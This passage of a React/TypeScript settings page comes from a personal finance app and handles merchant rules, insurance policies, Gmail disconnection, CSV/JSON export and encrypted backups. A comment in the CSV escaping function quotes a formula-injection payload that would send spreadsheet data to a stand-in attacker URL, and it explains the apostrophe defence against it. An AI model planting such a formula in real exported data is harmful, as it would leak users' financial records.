// ============================================
// SettingsPage — Application Preferences & Backups
// Manage merchant rules, backups, and localisations
// ============================================

import { APP_CONFIG } from '@/constants'
import { useState, useEffect } from 'react'
import { AppLayout } from '@/layouts'
import { Card, Button, Input, Modal } from '@/components/ui'
import {
  getMerchantRules,
  deleteMerchantRule,
  saveMerchantRule,
  supabase,
  fetchMerchantRules,
  saveMerchantRuleToDb,
  migrateLocalStorageRulesToDB
} from '@/services'
import { fetchAllTransactions } from '@/services/transactions'
import { getInsurancePolicies, createInsurancePolicy, deleteInsurancePolicy } from '@/services/insurance'
import { buildRestoreRow, selectRowsToRestore } from '@/services/backupRestore'
import { encryptText, decryptText, formatCurrency, formatDate, toISODateLocal, cn } from '@/utils'
import { useAuth } from '@/context/AuthContext'
import { useToast } from '@/context'
import { useCategories } from '@/context/CategoriesContext'
import CategoryManager from '@/components/settings/CategoryManager'
import CardManager from '@/components/settings/CardManager'
import {
  Brain,
  Trash2,
  Lock,
  Download,
  Upload,
  FileSpreadsheet,
  FileJson,
  Key,
  Globe,
  CheckCircle2,
  XCircle,
  HelpCircle,
  Plus,
  Check,
  Shield,
  Mail,
  CreditCard,
  SlidersHorizontal,
  Database,
} from 'lucide-react'

/**
 * Settings is grouped rather than listed. Nine sections in one column read as
 * a wall on a phone, and the previous 7/5 grid only helped above md.
 *
 * The grouping is by what a person came to do, not by which table the data
 * lives in: preferences and categories are both "how the app behaves", the
 * scanner's connection and its learned rules are both "how mail is read", and
 * backup, export and password are all "my data and my account".
 */
const SETTINGS_TABS = [
  { id: 'general',   label: 'General',    icon: SlidersHorizontal },
  { id: 'cards',     label: 'Cards',      icon: CreditCard },
  { id: 'scanning',  label: 'Scanning',   icon: Mail },
  { id: 'insurance', label: 'Insurance',  icon: Shield },
  { id: 'data',      label: 'Data',       icon: Database },
] as const

type SettingsTab = (typeof SETTINGS_TABS)[number]['id']

/**
 * What merchant_rules.auto_approve is written as for a hand-added rule.
 *
 * The column's own default, kept only so the row shape does not change. It is
 * dead data: applyMerchantRulesFromRows returns approval_status 'pending' for
 * every match regardless of it, which is invariant 1 in CLAUDE.md. Do not
 * reintroduce a control for it without changing that invariant first.
 */
const RULE_AUTO_APPROVE_DEFAULT = true

export default function SettingsPage() {
  const { user, currencySymbol, hasGoogleToken, disconnectGoogle } = useAuth()
  const { showToast } = useToast()
  const { categories, fallbackCategory } = useCategories()

  const [disconnectLoading, setDisconnectLoading] = useState(false)


  const handleDisconnectGmail = async () => {
    setDisconnectLoading(true)
    const { error } = await disconnectGoogle()
    setDisconnectLoading(false)
    if (error) {
      showToast(`Could not fully disconnect Gmail: ${error}`, 'error')
      return
    }
    showToast('Gmail disconnected. We no longer have access to your inbox.', 'success')
  }

  // Merchant Rules State
  const [merchantRules, setMerchantRules] = useState<Record<string, { category: string; autoApprove: boolean; ruleType: string }>>({})
  const [newKeyword, setNewKeyword] = useState('')
  const [newCategory, setNewCategory] = useState('')
  const [newRuleType, setNewRuleType] = useState<'income' | 'expense'>('expense')

  useEffect(() => {
    if (!newCategory && categories.length > 0) {
      setNewCategory(fallbackCategory?.name ?? categories[0].name)
    }
  }, [categories, fallbackCategory, newCategory])

  // Insurance Policies State
  const [policies, setPolicies] = useState<Array<{ id: string; policy_name: string; policy_type: string; premium_amount: number; frequency: string; next_due_date: string; remarks: string | null }>>([])
  const [newPolicyName, setNewPolicyName] = useState('')
  const [newPolicyType, setNewPolicyType] = useState<'life' | 'health'>('life')
  const [newPremium, setNewPremium] = useState('')
  const [newFrequency, setNewFrequency] = useState<'monthly' | 'quarterly' | 'half_yearly' | 'annual'>('annual')
  const [newDueDate, setNewDueDate] = useState('')
  const [newRemarks, setNewRemarks] = useState('')
  const [policyError, setPolicyError] = useState('')

  // Encryption Backup / Restore States
  const [backupPassword, setBackupPassword] = useState('')
  const [restorePassword, setRestorePassword] = useState('')
  const [backupLoading, setBackupLoading] = useState(false)
  const [restoreLoading, setRestoreLoading] = useState(false)
  const [backupSuccess, setBackupSuccess] = useState(false)
  const [restoreSuccess, setRestoreSuccess] = useState(false)
  const [restoreError, setRestoreError] = useState('')
  const [exportLoading, setExportLoading] = useState(false)
  // Both optional. Empty means "no bound on that end", so leaving the pair
  // untouched exports everything — the behaviour the button had before.
  const [exportFrom, setExportFrom] = useState('')
  const [exportTo, setExportTo] = useState('')
  const [exportRangeError, setExportRangeError] = useState('')

  // Change Password States
  const [newPassword, setNewPassword] = useState('')
  const [confirmPassword, setConfirmPassword] = useState('')
  const [changePasswordLoading, setChangePasswordLoading] = useState(false)
  const [changePasswordSuccess, setChangePasswordSuccess] = useState(false)
  const [changePasswordError, setChangePasswordError] = useState('')

  // Confirmation Modals States
  const [showRestoreConfirmModal, setShowRestoreConfirmModal] = useState(false)
  const [pendingRestoreData, setPendingRestoreData] = useState<any[] | null>(null)

  /**
   * Escape one value for a CSV cell.
   *
   * Beyond the usual double-quote doubling, this defuses CSV formula
   * injection. Merchant and description text arrives from scanned emails, and
   * anyone who knows the user's address can send them one — a merchant named
   * `=HYPERLINK("http://evil/?d="&A1,"Receipt")` is a live formula the moment
   * the exported file is opened in Excel or Sheets, exfiltrating the row it
   * sits next to. Excel treats a cell starting with = + - @ TAB or CR as a
   * formula regardless of the surrounding quotes, so the standard mitigation
   * is to push a leading apostrophe in front, which forces the cell to text.
   */
  const csvCell = (value: unknown) => {
    const raw = value === null || value === undefined ? '' : String(value)
    const defused = /^[=+\-@\t\r]/.test(raw) ? `'${raw}` : raw
    return `"${defused.replace(/"/g, '""')}"`
  }

  /**
   * The columns a person actually wants when they open this in a spreadsheet
   * or hand it to an accountant.
   *
   * The export used to emit the raw database row: a UUID primary key, an
   * internal confidence score, an event_type used only by the scanner, and
   * card_last4 — a column the app stopped populating when card data was
   * minimised, so it was always blank. None of that means anything to the
   * person reading the file, and the UUID in column A pushed the date, which
   * is what anyone actually sorts by, into column B.
   *
   * Money In / Money Out rather than credit / debit: those two words are
   * written from the BANK's point of view, and every user who has ever read a
   * statement has had to stop and translate them.
   */
  const exportRow = (t: any) => ({
    Date: t.date,
    Description: t.description || '',
    Merchant: t.merchant || '',
    Category: t.category,
    Amount: t.amount,
    Currency: t.currency || 'INR',
    Direction: t.type === 'credit' ? 'Money In' : 'Money Out',
    'Paid With': t.payment_mode && t.payment_mode !== 'unknown' ? t.payment_mode : '',
    Bank: t.card_issuer || '',
    'Added By': t.source === 'email' ? 'Email scan' : 'Manual entry',
    Status: t.approval_status === 'pending' ? 'Awaiting review' : 'Approved',
  })

  const handlePlainExport = async (format: 'csv' | 'json') => {
    // Caught here rather than returning an empty file: a backwards range
    // matches nothing, and "no transactions found" would send the user looking
    // for a data problem that does not exist.
    if (exportFrom && exportTo && exportFrom > exportTo) {
      setExportRangeError('The "from" date is after the "to" date.')
      return
    }
    setExportRangeError('')
    setExportLoading(true)
    try {
      // Pending transactions are included: an export that silently omits
      // everything still awaiting review is not the "all your data" the
      // Data Portability card promises.
      //
      // The date range is optional — leaving both empty exports everything,
      // which is what the button did before this control existed.
      const { data: txns } = await fetchAllTransactions({
        statuses: ['approved', 'pending'],
        ...(exportFrom ? { dateFrom: exportFrom } : {}),
        ...(exportTo ? { dateTo: exportTo } : {}),
      })
      if (!txns || txns.length === 0) {
        showToast(
          exportFrom || exportTo
            ? 'No transactions found in that date range.'
            : 'No transaction records found to export.',
          'warning'
        )
        return
      }

      const rows = txns.map(exportRow)
      const columns = Object.keys(rows[0]) as (keyof (typeof rows)[0])[]

      // Named after the range it actually covers, so two exports don't land in
      // the Downloads folder as indistinguishable files.
      const rangeLabel = exportFrom || exportTo
        ? `${exportFrom || 'start'}_to_${exportTo || 'today'}`
        : 'all'

      let content = ''
      let mimeType = ''
      let filename = ''

      if (format === 'csv') {
        const header = columns.join(',')
        const body = rows
          .map((row) =>
            columns
              .map((col) =>
                // Amount stays unquoted so spreadsheets keep it numeric;
                // everything else goes through the formula-injection guard.
                col === 'Amount' ? row[col] : csvCell(row[col])
              )
              .join(',')
          )
          .join('\n')
        content = `${header}\n${body}`
        mimeType = 'text/csv;charset=utf-8;'
        filename = `Intrack_Transactions_${rangeLabel}.csv`
      } else {
        content = JSON.stringify(rows, null, 2)
        mimeType = 'application/json;charset=utf-8;'
        filename = `Intrack_Transactions_${rangeLabel}.json`
      }

      const blob = new Blob([content], { type: mimeType })
      const url = URL.createObjectURL(blob)
      const link = document.createElement('a')
      link.setAttribute('href', url)
      link.setAttribute('download', filename)
      document.body.appendChild(link)
      link.click()
      document.body.removeChild(link)
    } catch (err: any) {
      showToast('Failed to export data: ' + err.message, 'error')
    } finally {
      setExportLoading(false)
    }
  }

  /**
   * Load the merchant rules, preferring the database.
   *
   * The localStorage fallback fires only when the database could not be READ —
   * never when it simply returned nothing. It used to key off
   * `data.length > 0`, which cannot tell "this account has no rules" from "the
   * request failed", so deleting your last rule fell through to the browser
   * copy and rules you had just removed reappeared. Rules created on another
   * device made it worse: the local copy is stale by definition, so the list
   * could repopulate with something the account no longer had anywhere.
   *
   * An empty database answer is a real answer. Only a throw is not.
   */
  const loadRules = async () => {
    if (user) {
      const { rules, ok } = await fetchMerchantRules(user.id)
      if (ok) {
        const dbRules: Record<string, { category: string; autoApprove: boolean; ruleType: string }> = {}
        rules.forEach(r => {
          dbRules[r.merchant_key] = { category: r.preferred_category, autoApprove: r.auto_approve, ruleType: r.rule_type }
        })
        setMerchantRules(dbRules)
        return
      }
      // ok === false: the read failed. Showing the last known rules beats
      // showing none while the database is unreachable, so fall through.
    }
    // Signed out, or the database could not be reached.
    const localRules = getMerchantRules()
    const withType: Record<string, { category: string; autoApprove: boolean; ruleType: string }> = {}
    Object.entries(localRules).forEach(([key, rule]) => {
      withType[key] = { ...rule, ruleType: 'expense' }
    })
    setMerchantRules(withType)
  }

  useEffect(() => {
    document.title = `Settings | ${APP_CONFIG.APP_NAME}`
    if (user) {
      // Migrate and then load
      migrateLocalStorageRulesToDB(user.id).finally(() => {
        loadRules()
      })
    } else {
      loadRules()
    }
  }, [user])

  useEffect(() => {
    getInsurancePolicies().then(({ data }) => {
      if (data) setPolicies(data)
    })
  }, [])

  const handleAddPolicy = async (e: React.FormEvent) => {
    e.preventDefault()
    setPolicyError('')

    const premiumNum = Number(newPremium)
    if (!newPolicyName.trim()) {
      setPolicyError('Enter a policy name')
      return
    }
    if (isNaN(premiumNum) || premiumNum <= 0) {
      setPolicyError('Enter a valid premium amount')
      return
    }
    if (!newDueDate) {
      setPolicyError('Pick a due date')
      return
    }

    const { data, error } = await createInsurancePolicy({
      policy_name: newPolicyName.trim(),
      policy_type: newPolicyType,
      premium_amount: premiumNum,
      frequency: newFrequency,
      next_due_date: newDueDate,
      remarks: newRemarks || null,
    })

    if (error) {
      setPolicyError(error.message)
      return
    }

    if (data) setPolicies((prev) => [...prev, data].sort((a, b) => a.next_due_date.localeCompare(b.next_due_date)))
    setNewPolicyName('')
    setNewPremium('')
    setNewDueDate('')
    setNewRemarks('')
  }

  const handleDeletePolicy = async (id: string) => {
    await deleteInsurancePolicy(id)
    setPolicies((prev) => prev.filter((p) => p.id !== id))
  }

  const handleDeleteRule = async (key: string) => {
    deleteMerchantRule(key)
    if (user) {
      try {
        await supabase.from('merchant_rules').delete().eq('user_id', user.id).eq('merchant_key', key)
      } catch (err) {
        console.error('Failed to delete rule from DB:', err)
      }
    }
    loadRules()
  }

  const handleUpdateRuleCategory = async (key: string, category: string) => {
    const currentRule = merchantRules[key]
    const autoApprove = currentRule ? currentRule.autoApprove : true
    saveMerchantRule(key, category, autoApprove)
    if (user) {
      try {
        await supabase.from('merchant_rules').update({
          preferred_category: category,
          last_updated: new Date().toISOString()
        }).eq('user_id', user.id).eq('merchant_key', key)
      } catch (err) {
        console.error('Failed to update rule category in DB:', err)
      }
    }
    loadRules()
  }

  const handleUpdateRuleType = async (key: string, ruleType: string) => {
    if (user) {
      try {
        await supabase.from('merchant_rules').update({
          rule_type: ruleType,
          last_updated: new Date().toISOString(),
        }).eq('user_id', user.id).eq('merchant_key', key)
      } catch (err) {
        console.error('Failed to update rule type in DB:', err)
      }
    }
    loadRules()
  }

  const handleAddCustomRule = async (e: React.FormEvent) => {
    e.preventDefault()
    if (!newKeyword.trim()) return

    // auto_approve is written as the column's own default. Nothing reads it —
    // the scanner returns 'pending' for every rule match (CLAUDE.md invariant
    // 1) — so this is here to keep the row shape unchanged, not to grant
    // anything. The control that used to set it is gone.
    saveMerchantRule(newKeyword, newCategory, RULE_AUTO_APPROVE_DEFAULT)
    if (user) {
      try {
        await saveMerchantRuleToDb(user.id, newKeyword, newCategory, RULE_AUTO_APPROVE_DEFAULT, undefined, newRuleType)
      } catch (err) {
        console.error('Failed to save rule to DB:', err)
      }
    }

    setNewKeyword('')
    setNewCategory(fallbackCategory?.name ?? categories[0]?.name ?? '')
    setNewRuleType('expense')
    loadRules()
  }

  const handleBackup = async (e: React.FormEvent) => {
    e.preventDefault()
    if (!backupPassword) return
    setBackupLoading(true)
    setBackupSuccess(false)
    try {
      // Every row, approved and pending alike. A backup that stops at the
      // first page or drops the review queue is data loss the user only finds
      // out about when they try to restore it.
      const { data: txns } = await fetchAllTransactions({ statuses: ['approved', 'pending'] })
      if (!txns || txns.length === 0) {
        showToast('No transaction records found to export.', 'warning')
        setBackupLoading(false)
        return
      }

      const jsonStr = JSON.stringify(txns)
      const encrypted = await encryptText(jsonStr, backupPassword)

      const blob = new Blob([encrypted], { type: 'text/plain;charset=utf-8;' })
      const url = URL.createObjectURL(blob)
      const link = document.createElement('a')
      link.setAttribute('href', url)
      link.setAttribute('download', `Intrack_Encrypted_Backup_${toISODateLocal(new Date())}.drbak`)
      document.body.appendChild(link)
      link.click()
      document.body.removeChild(link)
      
      setBackupSuccess(true)
      setBackupPassword('')
    } catch (err: any) {
      showToast('Failed to generate encrypted backup: ' + err.message, 'error')
    } finally {
      setBackupLoading(false)
    }
  }

  const handleRestore = async (e: React.FormEvent) => {
    e.preventDefault()
    setRestoreError('')
    setRestoreSuccess(false)

    const fileInput = document.getElementById('restore-file-input') as HTMLInputElement
    const file = fileInput?.files?.[0]
    if (!file) {
      setRestoreError('Please select a .drbak backup file.')
      return
    }
    if (!restorePassword) {
      setRestoreError('Please enter the decryption password.')
      return
    }

    setRestoreLoading(true)
    try {
      const fileText = await file.text()
      const decrypted = await decryptText(fileText.trim(), restorePassword)
      const parsed = JSON.parse(decrypted)

      if (!Array.isArray(parsed)) {
        throw new Error('Backup format is invalid: expected a list of transactions.')
      }

      setPendingRestoreData(parsed)
      setShowRestoreConfirmModal(true)
    } catch (err: any) {
      console.error('Restore error:', err)
      setRestoreError(err.message || 'Decryption failed. Please verify the file and password.')
    } finally {
      setRestoreLoading(false)
    }
  }

  const executeRestore = async () => {
    if (!pendingRestoreData) return
    setRestoreLoading(true)
    try {
      // The dedup set has to cover the whole table. Built from a truncated
      // first page it would miss older transactions and happily re-insert them
      // as duplicates on every restore. Pending rows count too, since the
      // backup now contains them.
      const { data: currentTxns, error: currentErr } = await fetchAllTransactions({
        statuses: ['approved', 'pending'],
      })
      if (currentErr) {
        throw new Error('Could not read your existing transactions, so the merge was cancelled rather than risk creating duplicates.')
      }
      const toInsert = selectRowsToRestore(pendingRestoreData, currentTxns ?? [])

      if (toInsert.length > 0) {
        const cleanTxns = toInsert.map((t) => buildRestoreRow(t, user?.id))

        const { error: insertErr } = await supabase.from('transactions').insert(cleanTxns)
        if (insertErr) throw insertErr
      }

      setRestoreSuccess(true)
      setRestorePassword('')
      const fileInput = document.getElementById('restore-file-input') as HTMLInputElement
      if (fileInput) fileInput.value = ''
      showToast(`Merged ${toInsert.length} new transactions from backup!`, 'success')
    } catch (err: any) {
      console.error('Restore error:', err)
      setRestoreError(err.message || 'Merge failed. Please try again.')
    } finally {
      setRestoreLoading(false)
      setShowRestoreConfirmModal(false)
      setPendingRestoreData(null)
    }
  }

  const handleChangePassword = async (e: React.FormEvent) => {
    e.preventDefault()
    setChangePasswordError('')
    setChangePasswordSuccess(false)

    if (newPassword.length < 6) {
      setChangePasswordError('Password must be at least 6 characters long.')
      return
    }

    if (newPassword !== confirmPassword) {
      setChangePasswordError('Passwords do not match.')
      return
    }

    setChangePasswordLoading(true)

    try {
      const { error } = await supabase.auth.updateUser({
        password: newPassword,
      })

      if (error) {
        setChangePasswordError(error.message)
      } else {
        setChangePasswordSuccess(true)
        setNewPassword('')
        setConfirmPassword('')
        showToast('🔑 Password changed successfully!', 'success')
      }
    } catch (err: any) {
      setChangePasswordError(err.message || 'Failed to change password.')
    } finally {
      setChangePasswordLoading(false)
    }
  }

  const [tab, setTab] = useState<SettingsTab>('general')

  return (
    <AppLayout>
      <div className="space-y-8 animate-fade-in">
        {/* Header */}
        <div>
          <h1 className="text-2xl font-bold tracking-tight text-white md:text-3xl">Configuration Settings</h1>
          <p className="mt-1 text-sm text-zinc-400">
            Your categories and cards, how your inbox is read, and what happens to your data.
          </p>
        </div>

        {/* Section nav.
            Nine sections stacked in one column is what made this page unusable
            on a phone. Only one group renders at a time now; the strip scrolls
            sideways where it does not fit and wraps where it does. */}
        <div className="-mx-4 px-4 sm:mx-0 sm:px-0 overflow-x-auto">
          <div
            role="tablist"
            aria-label="Settings sections"
            className="flex gap-1.5 min-w-max sm:min-w-0 sm:flex-wrap pb-1"
          >
            {SETTINGS_TABS.map((t) => {
              const Icon = t.icon
              const isActive = tab === t.id
              return (
                <button
                  key={t.id}
                  role="tab"
                  aria-selected={isActive}
                  onClick={() => setTab(t.id)}
                  className={cn(
                    'flex items-center gap-2 rounded-xl px-3.5 h-11 text-xs font-semibold whitespace-nowrap transition-all border cursor-pointer',
                    isActive
                      ? 'bg-brand-500/10 border-brand-500/30 text-brand-400 shadow-sm'
                      : 'bg-surface-1 border-border-subtle text-zinc-400 hover:text-zinc-200 hover:border-zinc-600'
                  )}
                >
                  <Icon className="h-4 w-4 shrink-0" />
                  {t.label}
                </button>
              )
            })}
          </div>
        </div>

        {/* One column throughout. The old 7/5 split only ever applied above
            md, and below it produced a single very long scroll. */}
        <div className="space-y-6 max-w-3xl">
          {tab === 'general' && (
            <>
            {/* General Preferences Card */}
            <Card className="border-border-subtle bg-surface-1 shadow-md">
              <h2 className="text-base font-bold text-zinc-200 mb-2 flex items-center gap-2">
                <Globe className="h-5 w-5 text-brand-400 shrink-0" />
                <span>General Preferences</span>
              </h2>
              {/* This card said "Configure your currency formatting and locale
                  structure" above a single fixed line. There is nothing to
                  configure — Intrack is built for the Indian market and both
                  values are constants. Saying so is more useful than implying a
                  control that does not exist and never did. */}
              <p className="text-xs text-zinc-400 mb-4 leading-relaxed">
                Intrack is built for India, so amounts and dates use Indian conventions.
                These are fixed and not configurable.
              </p>

              <div className="space-y-3 text-xs">
                <div className="flex items-center justify-between">
                  <span className="text-zinc-400">Currency</span>
                  <span className="font-bold text-zinc-300 font-mono">INR ({currencySymbol})</span>
                </div>
                <div className="flex items-center justify-between">
                  <span className="text-zinc-400">Date format</span>
                  <span className="font-bold text-zinc-300 font-mono">dd/mm/yyyy</span>
                </div>
                <div className="flex items-center justify-between">
                  <span className="text-zinc-400">Language Locale</span>
                  <span className="font-bold text-zinc-300 font-mono">en-IN</span>
                </div>
              </div>
            </Card>
            {/* Manage Categories Card */}
            <CategoryManager />
            </>
          )}

          {tab === 'cards' && <CardManager />}

          {tab === 'scanning' && (
            <>
            {/* Gmail Connection Card */}
            <Card className="border-border-subtle bg-surface-1 shadow-md">
              <h2 className="text-base font-bold text-zinc-200 mb-2 flex items-center gap-2">
                <Mail className="h-5 w-5 text-brand-400 shrink-0" />
                <span>Gmail Inbox Connection</span>
              </h2>
              {hasGoogleToken ? (
                <>
                  <p className="text-xs text-zinc-400 mb-4 leading-relaxed">
                    Intrack reads bank transaction alerts from your Gmail when you run a scan,
                    and logs them as expenses for you to approve. Disconnecting revokes our access
                    at Google immediately, so no further scan can run. Your already-imported
                    transactions stay untouched.
                  </p>
                  <Button
                    onClick={handleDisconnectGmail}
                    variant="secondary"
                    className="w-full text-xs justify-center gap-1.5 cursor-pointer"
                    disabled={disconnectLoading}
                  >
                    <XCircle className="h-4 w-4 shrink-0" />
                    {disconnectLoading ? 'Disconnecting…' : 'Disconnect Gmail'}
                  </Button>
                </>
              ) : (
                <p className="text-xs text-zinc-400 leading-relaxed">
                  Gmail is not connected. Intrack has no access to your inbox. You can connect it
                  from the Pending Alerts page to import bank transaction emails automatically.
                </p>
              )}
            </Card>
            {/* Smart Merchant Rules Card */}
            <Card className="border-border-subtle bg-surface-1 shadow-md">
              <h2 className="text-base font-bold text-zinc-200 mb-2 flex items-center gap-2">
                <Brain className="h-5 w-5 text-brand-400 shrink-0" />
                <span>Smart Merchant Rules</span>
              </h2>
              {/* This used to promise that Intrack "auto-approves them when
                  confidence is high", alongside a per-rule Auto-Approve
                  checkbox. Neither was true: applyMerchantRulesFromRows returns
                  approval_status 'pending' for every match regardless of
                  confidence, auto_approve or times_confirmed, which is
                  invariant 1 in CLAUDE.md. The checkbox wrote a column nothing
                  reads, so it was a switch that changed nothing — and it
                  implied a user could turn OFF a protection that is actually
                  unconditional. Both are gone; the copy now says what the
                  scanner does. */}
              <p className="text-xs text-zinc-400 mb-4 leading-relaxed">
                Rules learned from your manual approvals. Intrack applies the category
                automatically to matching transactions — but every one still lands in
                Pending for you to approve. Nothing is ever added to your accounts
                without you.
              </p>

              {/* Inline Rule Creator Form */}
              <form onSubmit={handleAddCustomRule} className="grid grid-cols-1 sm:grid-cols-2 xl:grid-cols-4 gap-2 mb-4 p-3 bg-surface-2/40 border border-border-subtle/30 rounded-xl">
                <div>
                  <Input
                    placeholder="Keyword (e.g. Swiggy)"
                    value={newKeyword}
                    onChange={(e) => setNewKeyword(e.target.value)}
                    className="text-xs h-11"
                    aria-label="Merchant Name Keyword"
                    required
                  />
                </div>
                <div>
                  <select
                    value={newCategory}
                    onChange={(e) => setNewCategory(e.target.value)}
                    aria-label="Merchant Category"
                    className="w-full bg-surface-2 border border-border-subtle/50 text-xs rounded-xl h-11 px-3 text-zinc-300 focus:outline-none focus:ring-1 focus:ring-brand-400"
                  >
                    {categories.map((cat) => (
                      <option key={cat.id} value={cat.name}>{cat.emoji} {cat.name}</option>
                    ))}
                  </select>
                </div>
                <div>
                  <select
                    value={newRuleType}
                    onChange={(e) => setNewRuleType(e.target.value as 'income' | 'expense')}
                    aria-label="Merchant Rule Type"
                    className="w-full bg-surface-2 border border-border-subtle/50 text-xs rounded-xl h-11 px-3 text-zinc-300 focus:outline-none focus:ring-1 focus:ring-brand-400"
                  >
                    <option value="expense">🔴 Expense</option>
                    <option value="income">🟢 Income</option>
                  </select>
                </div>
                <div className="flex items-center justify-end gap-2">
                  <Button size="md" type="submit" className="px-3 text-xs gap-1.5">
                    <Plus className="h-3.5 w-3.5" /> Add Rule
                  </Button>
                </div>
              </form>

              {Object.keys(merchantRules).length === 0 ? (
                <div className="rounded-xl border border-dashed border-zinc-800 p-4 text-center text-xs text-zinc-500">
                  No rules learned yet. Approve pending alerts or add one above!
                </div>
              ) : (
                <div className="space-y-2 max-h-[400px] overflow-y-auto pr-1">
                  {Object.entries(merchantRules).map(([key, rule]) => {
                    return (
                      <div
                        key={key}
                        className="flex flex-col sm:flex-row sm:items-center justify-between p-3 rounded-xl bg-surface-2/60 border border-border-subtle/30 text-xs transition-colors hover:bg-surface-2 gap-2"
                      >
                        <div className="flex flex-col gap-1">
                          <span className="font-semibold text-zinc-200 capitalize truncate max-w-[150px]">{key}</span>
                        </div>
                        <div className="flex items-center gap-2 justify-between sm:justify-end">
                          <select
                            value={rule.category}
                            onChange={(e) => handleUpdateRuleCategory(key, e.target.value)}
                            className="bg-surface-0 border border-border-subtle/50 text-xs rounded-xl p-1 text-zinc-300 focus:outline-none focus:ring-1 focus:ring-brand-400"
                          >
                            {categories.map((cat) => (
                              <option key={cat.id} value={cat.name}>{cat.emoji} {cat.name}</option>
                            ))}
                          </select>
                          <select
                            value={rule.ruleType}
                            onChange={(e) => handleUpdateRuleType(key, e.target.value)}
                            aria-label={`Rule type for ${key}`}
                            className="bg-surface-0 border border-border-subtle/50 text-xs rounded-xl p-1 text-zinc-300 focus:outline-none focus:ring-1 focus:ring-brand-400"
                          >
                            <option value="expense">🔴 Expense</option>
                            <option value="income">🟢 Income</option>
                          </select>
                          <button
                            onClick={() => handleDeleteRule(key)}
                            className="h-10 w-10 rounded text-zinc-500 hover:text-[var(--status-danger-text)] hover:bg-[var(--status-danger-subtle)] transition-colors flex items-center justify-center shrink-0"
                            title="Delete Rule"
                            aria-label={`Delete rule for ${key}`}
                          >
                            <Trash2 className="h-4 w-4" />
                          </button>
                        </div>
                      </div>
                    )
                  })}
                </div>
              )}
            </Card>
            </>
          )}

          {tab === 'insurance' && (
            <>
            {/* Insurance Policies Card */}
            <Card id="insurance-policies" className="border-border-subtle bg-surface-1 shadow-md">
              <h2 className="text-base font-bold text-zinc-200 mb-2 flex items-center gap-2">
                <Shield className="h-5 w-5 text-brand-400 shrink-0" />
                <span>Insurance Policies</span>
              </h2>
              <p className="text-xs text-zinc-400 mb-4 leading-relaxed">
                Track life and health insurance premiums. You'll get a reminder before each is due.
              </p>

              {policyError && (
                <div className="text-xs p-2.5 mb-3 bg-[var(--status-danger-subtle)] border border-[var(--status-danger-border)] text-[var(--status-danger-text)] rounded-xl">
                  {policyError}
                </div>
              )}

              <form onSubmit={handleAddPolicy} className="grid gap-3 sm:grid-cols-2 mb-4">
                <input
                  type="text"
                  placeholder="Policy name (e.g. LIC Term Plan)"
                  value={newPolicyName}
                  onChange={(e) => setNewPolicyName(e.target.value)}
                  aria-label="Policy name"
                  className="bg-surface-2 border border-border-subtle/50 text-xs rounded-xl h-11 px-3 text-zinc-200 focus:outline-none focus:ring-1 focus:ring-brand-400 sm:col-span-2"
                />
                <select
                  value={newPolicyType}
                  onChange={(e) => setNewPolicyType(e.target.value as 'life' | 'health')}
                  aria-label="Policy type"
                  className="bg-surface-2 border border-border-subtle/50 text-xs rounded-xl h-11 px-3 text-zinc-300 focus:outline-none focus:ring-1 focus:ring-brand-400"
                >
                  <option value="life">🧬 Life</option>
                  <option value="health">🏥 Health</option>
                </select>
                <select
                  value={newFrequency}
                  onChange={(e) => setNewFrequency(e.target.value as typeof newFrequency)}
                  aria-label="Premium frequency"
                  className="bg-surface-2 border border-border-subtle/50 text-xs rounded-xl h-11 px-3 text-zinc-300 focus:outline-none focus:ring-1 focus:ring-brand-400"
                >
                  <option value="monthly">Monthly</option>
                  <option value="quarterly">Quarterly</option>
                  <option value="half_yearly">Half-yearly</option>
                  <option value="annual">Annual</option>
                </select>
                <input
                  type="number"
                  placeholder={`Premium (${currencySymbol})`}
                  value={newPremium}
                  onChange={(e) => setNewPremium(e.target.value)}
                  min="1"
                  step="0.01"
                  className="bg-surface-2 border border-border-subtle/50 text-xs rounded-xl h-11 px-3 text-zinc-200 focus:outline-none focus:ring-1 focus:ring-brand-400"
                />
                <input
                  type="date"
                  value={newDueDate}
                  onChange={(e) => setNewDueDate(e.target.value)}
                  aria-label="Next due date"
                  className="bg-surface-2 border border-border-subtle/50 text-xs rounded-xl h-11 px-3 text-zinc-200 focus:outline-none focus:ring-1 focus:ring-brand-400"
                />
                <input
                  type="text"
                  placeholder="Remarks (optional)"
                  value={newRemarks}
                  onChange={(e) => setNewRemarks(e.target.value)}
                  aria-label="Remarks"
                  className="bg-surface-2 border border-border-subtle/50 text-xs rounded-xl h-11 px-3 text-zinc-200 focus:outline-none focus:ring-1 focus:ring-brand-400 sm:col-span-2"
                />
                <Button size="sm" type="submit" className="sm:col-span-2 justify-center">
                  Add Policy
                </Button>
              </form>

              {policies.length === 0 ? (
                <div className="rounded-xl border border-dashed border-zinc-800 p-4 text-center text-xs text-zinc-500">
                  No policies added yet.
                </div>
              ) : (
                <div className="space-y-2">
                  {policies.map((p) => (
                    <div
                      key={p.id}
                      className="flex items-center justify-between gap-2 p-3 rounded-xl bg-surface-2/60 border border-border-subtle/30 text-xs"
                    >
                      <div className="min-w-0">
                        <span className="font-semibold text-zinc-200 truncate block">
                          {p.policy_type === 'life' ? '🧬' : '🏥'} {p.policy_name}
                        </span>
                        <span className="text-xs text-zinc-500">
                          {formatCurrency(p.premium_amount)} · {p.frequency.replace('_', '-')} · due {formatDate(p.next_due_date)}
                        </span>
                      </div>
                      <button
                        onClick={() => handleDeletePolicy(p.id)}
                        className="h-10 w-10 rounded text-zinc-500 hover:text-[var(--status-danger-text)] hover:bg-[var(--status-danger-subtle)] transition-colors flex items-center justify-center shrink-0"
                        title="Delete policy"
                        aria-label={`Delete ${p.policy_name}`}
                      >
                        <Trash2 className="h-4 w-4" />
                      </button>
                    </div>
                  ))}
                </div>
              )}
            </Card>
            </>
          )}

          {tab === 'data' && (
            <>
            {/* Encrypted Backup & Restore Card */}
            <Card className="border-border-subtle bg-surface-1 shadow-md">
              <h2 className="text-base font-bold text-zinc-200 mb-2 flex items-center gap-2">
                <Lock className="h-5 w-5 text-brand-400 shrink-0" />
                <span>Privacy-First Encrypted Backup</span>
              </h2>
              <p className="text-xs text-zinc-400 mb-6 leading-relaxed">
                Securely export or restore your transactions locally. Every transaction is included — approved ones and anything still waiting in Pending. All backups are encrypted client-side using industry-standard **AES-256-GCM** before downloading.
              </p>

              <div className="space-y-6">
                {/* Export Block */}
                <div className="space-y-4">
                  <h3 className="text-xs font-bold text-zinc-300 uppercase tracking-wider">Download Backup</h3>
                  <form onSubmit={handleBackup} className="space-y-3">
                    {backupSuccess && (
                      <div className="rounded-xl bg-[var(--status-positive-subtle)] border border-[var(--status-positive-border)] p-2.5 text-[11px] text-[var(--status-positive-text)] leading-relaxed animate-fade-in flex items-start gap-2">
